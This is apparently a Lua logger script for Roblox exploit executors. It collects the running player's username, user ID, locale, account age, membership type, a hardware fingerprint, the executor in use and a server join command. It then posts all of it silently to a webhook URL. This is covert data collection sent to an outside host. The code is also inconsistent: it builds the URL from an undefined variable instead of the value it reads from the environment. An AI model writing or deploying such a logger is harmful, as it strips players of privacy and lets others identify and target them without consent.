-->> HWID <<--
local Http_Request = syn.request;
local Body = Http_Request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local Decoded = game:GetService('HttpService'):JSONDecode(Body)

-->> MAIN LOGGER <<--
local Players = game:GetService("Players");
local LocalPlayer = Players.LocalPlayer;
local DName = LocalPlayer.DisplayName;
local Name = LocalPlayer.Name;
local Userid = LocalPlayer.UserId;
local Countiry = game:GetService("LocalizationService").RobloxLocaleId;
local GetHwid = Decoded.headers["Syn-Fingerprint"];
local AccountAge = LocalPlayer.AccountAge;
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21);
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'

-->> GAME INFO <<--
local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or (secure_load and "Sentinel") or (pebc_execute and "ProtoSmasher") or (KRNL_LOADED and "Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "Script-Ware") or ("Unsupported")

local api_key = os.getenv("WEBHOOK")
local url = tostring(WEBHOOK)

local data = {
   ["avatar_url"] = "",
   ["content"] = "",
   ["embeds"] = {
       {
    
      ["author"] = {
      ["name"] = "( Someone Logged Into DataBase )",
      ["url"] = "https://roblox.com",
    },

           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."\n**Country:** "..game:GetService("LocalizationService").RobloxLocaleId.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Exploit:** "..webhookcheck.."\n\n**JobId:**".."```"..ConsoleJobId.."```" ,
           ["type"] = "rich",
           ["color"] = tonumber(0xf2ff00),
           ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"},
            }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
wait(1)
